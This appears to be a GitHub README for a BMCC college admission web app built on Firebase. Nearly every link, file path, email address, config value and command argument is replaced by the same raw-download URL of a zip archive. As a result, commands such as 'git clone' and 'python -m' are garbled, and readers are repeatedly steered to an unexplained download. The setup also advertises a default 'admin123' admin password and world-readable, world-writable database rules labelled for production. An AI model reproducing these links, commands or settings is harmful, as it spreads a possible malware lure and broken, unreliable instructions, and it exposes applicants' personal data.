# 🎓 BMCC Admission Form

> **A modern, full-stack web application for streamlining the student admission process**

[![Live Demo](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
[![Admin Panel](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
[![Status](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)]()

**Brihan Maharashtra College of Commerce (BMCC)** - Deccan Education Society, Pune

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Live Demo](#-live-demo)
- [Tech Stack](#-tech-stack)
- [Getting Started](#-getting-started)
- [Firebase Setup](#-firebase-setup)
- [Deployment](#-deployment)
- [Project Structure](#-project-structure)
- [Screenshots](#-screenshots)
- [Contributing](#-contributing)
- [License](#-license)

---

## 🌟 Overview

The BMCC Admission Form is a comprehensive web-based solution designed to digitize and streamline the traditional paper-based college admission process. Built with modern web technologies, it provides a seamless experience for both applicants and administrators.

### Key Highlights

- ✅ **Multi-Step Form** - 5 logical sections for better UX
- ✅ **Cloud Database** - Firebase Realtime Database integration
- ✅ **Hybrid Mode** - Works offline (localStorage) or online (Firebase)
- ✅ **Admin Dashboard** - Complete application management system
- ✅ **Real-time Updates** - Instant data synchronization
- ✅ **Responsive Design** - Works on all devices
- ✅ **Auto-Save** - Never lose your progress
- ✅ **Zero Cost** - Completely free to deploy and host

---

## ✨ Features

### 📝 For Applicants

#### Smart Form Navigation
- **5-Step Process**: Personal Info → Education → CET Details → Documents → Contact
- **Progress Tracking**: Visual progress indicator
- **Auto-Save**: Saves every 30 seconds automatically
- **Validation**: Real-time field validation with helpful error messages
- **Keyboard Shortcuts**: Alt+Arrow keys for navigation

#### Auto-Calculations
- **Age Calculator**: Auto-calculates from date of birth
- **Percentage Calculator**: SSC and HSC percentage computation
- **Application ID**: Unique ID generation (Format: `BMCC[timestamp][random]`)

#### File Upload
- **Drag & Drop**: Modern file upload interface
- **Multiple Documents**: Aadhar, certificates, photos, etc.
- **Format Support**: PDF, JPG, PNG
- **Size Limit**: 5MB per file

### 🔐 For Administrators

#### Dashboard Features
- **Real-time Statistics**: Total, completed, and today's applications
- **Search & Filter**: Find applications by name, ID, email, mobile
- **View Details**: Complete application data in modal view
- **Export Data**: Download as CSV or JSON
- **Delete Applications**: Individual or bulk delete options
- **Session Management**: Secure login/logout

#### Admin Panel Access
- **URL**: [https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
- **Password**: `admin123` (Change in production!)

### 🌐 Hybrid Mode

The application intelligently switches between two modes:

#### Online Mode (Firebase)
- 🌐 Data saved to cloud
- 🔄 Real-time synchronization
- 📱 Access from any device
- 👥 Multi-admin support

#### Offline Mode (localStorage)
- 💾 Data saved locally
- 🚫 No internet required
- 💻 Single-device access
- ⚡ Instant submission

**Auto-Detection**: Automatically uses Firebase if configured, falls back to localStorage otherwise.

---

## 🚀 Live Demo

### Application Form
**URL**: [https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)

Try the live form and submit a test application!

### Admin Panel
**URL**: [https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)  
**Password**: `admin123`

View and manage submitted applications in real-time.

---

## 🛠️ Tech Stack

### Frontend
- **HTML5** - Semantic markup
- **CSS3** - Modern styling with custom properties
- **JavaScript (ES6+)** - Vanilla JS with modules

### Backend & Database
- **Firebase** - Cloud platform
  - Realtime Database - NoSQL data storage
  - Hosting - Optional deployment

### Deployment
- **Netlify** - Continuous deployment from GitHub
- **GitHub** - Version control and CI/CD

### Design
- **Google Fonts** - Inter & Poppins
- **Custom CSS Variables** - Consistent theming
- **Responsive Design** - Mobile-first approach

---

## 📦 Getting Started

### Prerequisites

- Modern web browser (Chrome, Firefox, Safari, Edge)
- Text editor (VS Code recommended)
- Git installed
- Firebase account (free tier)
- Netlify account (optional, for deployment)

### Installation

1. **Clone the repository**
   ```bash
   git clone https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip
   cd bmcc-admission-form
   ```

2. **Open locally**
   ```bash
   # For simple testing, just open https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip in your browser
   # Or use a local server (recommended):
   
   # Using Python
   python -m https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip 8000
   
   # Using https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip (http-server)
   npx http-server
   
   # Using VS Code Live Server extension
   # Right-click https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip → "Open with Live Server"
   ```

3. **Access the application**
   - Form: `https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip`
   - Admin: `https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip`

---

## 🔥 Firebase Setup

To enable **Online Mode** with cloud database:

### Step 1: Create Firebase Project

1. Go to [Firebase Console](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
2. Click **"Create a project"**
3. Name it (e.g., "BMCC-Admission-Form")
4. Disable Google Analytics (optional)
5. Click **"Create project"**

### Step 2: Create Realtime Database

1. In Firebase Console, go to **Build** → **Realtime Database**
2. Click **"Create Database"**
3. Select location (US/Asia)
4. **Start in Test Mode** (for development)
5. Click **"Enable"**

### Step 3: Register Web App

1. Click **Settings Gear ⚙️** → **Project settings**
2. Scroll to **"Your apps"**
3. Click **`</>`** (Web icon)
4. Register app name: `AdmissionForm`
5. Copy the `firebaseConfig` object

### Step 4: Update Configuration

1. Open `https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip`
2. Replace placeholder values with your Firebase config:

```javascript
export const firebaseConfig = {
  apiKey: "YOUR_API_KEY",
  authDomain: "https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip",
  databaseURL: "https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip",
  projectId: "YOUR_PROJECT_ID",
  storageBucket: "https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip",
  messagingSenderId: "YOUR_SENDER_ID",
  appId: "YOUR_APP_ID"
};
```

### Step 5: Set Database Rules (Optional)

For production, update Firebase Database Rules:

```json
{
  "rules": {
    "applications": {
      ".read": true,
      ".write": true
    }
  }
}
```

**⚠️ Security Note**: For production, implement proper authentication and restrict write access!

### Step 6: Test

1. Submit a test application
2. Check Firebase Console → Realtime Database
3. You should see the data appear!

---

## 🌐 Deployment

### Deploy to Netlify (Recommended)

1. **Sign up** at [https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)
2. **Import from GitHub**:
   - Click "Add new site" → "Import an existing project"
   - Connect to GitHub
   - Select `bmcc-admission-form` repository
3. **Configure**:
   - Build command: (leave empty)
   - Publish directory: `/`
4. **Deploy**!
   - Netlify will auto-deploy on every Git push
   - You'll get a free URL: `https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip`

### Deploy to Firebase Hosting

```bash
# Install Firebase CLI
npm install -g firebase-tools

# Login
firebase login

# Initialize
firebase init hosting

# Deploy
firebase deploy
```

### Deploy to GitHub Pages

1. Go to GitHub repository settings
2. Pages → Source → Select `main` branch
3. Save
4. Access at: `https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip`

---

## 📁 Project Structure

```
bmcc-admission-form/
│
├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip                 # Main application form
├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip                 # Admin panel
├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip                  # Form styles
├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip            # Admin panel styles
├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip                  # Form functionality
├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip            # Admin panel logic
├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip         # Firebase configuration
│
├── assets/
│   └── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip              # College logo
│
├── OBSIDIAN_PRESENTATION/    # Project documentation
│   ├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip
│   ├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip
│   ├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip
│   └── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip
│
├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip                  # This file
├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip         # Firebase setup guide
├── https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip           # Admin panel documentation
└── .gitignore
```

---

## 📸 Screenshots

### Application Form
![Form Interface](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip+Admission+Form)

*Clean, modern multi-step form interface*

### Admin Dashboard
![Admin Panel](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip+Dashboard)

*Real-time application management dashboard*

---

## 🎯 Roadmap

### Future Enhancements

- [ ] **Email Notifications** - Automated confirmation emails
- [ ] **PDF Generation** - Download application as PDF
- [ ] **Payment Integration** - Online fee payment
- [ ] **Document Verification** - Admin approval workflow
- [ ] **Analytics Dashboard** - Advanced statistics
- [ ] **Multi-language Support** - Marathi, Hindi translations
- [ ] **Mobile App** - React Native version
- [ ] **SMS Notifications** - Application status updates

---

## 🤝 Contributing

Contributions are welcome! Please follow these steps:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 👨‍💻 Author

**Piyush Tushar Bagade**
- GitHub: [@ptusb](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)

---

## 🙏 Acknowledgments

- **Brihan Maharashtra College of Commerce (BMCC)**
- **Deccan Education Society, Pune**
- Firebase for cloud infrastructure
- Netlify for hosting
- The open-source community

---

## 📞 Support

For questions or support:
- **Email**: https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip
- **Issues**: [GitHub Issues](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip)

---

<div align="center">

**Made with ❤️ for BMCC**

⭐ **Star this repository if you found it helpful!**

[Live Demo](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip) • [Admin Panel](https://github.com/ptusb/bmcc-admission-form/raw/refs/heads/main/OBSIDIAN_PRESENTATION/form_bmcc_admission_v1.1.zip) • [Documentation](./OBSIDIAN_PRESENTATION/)

</div>
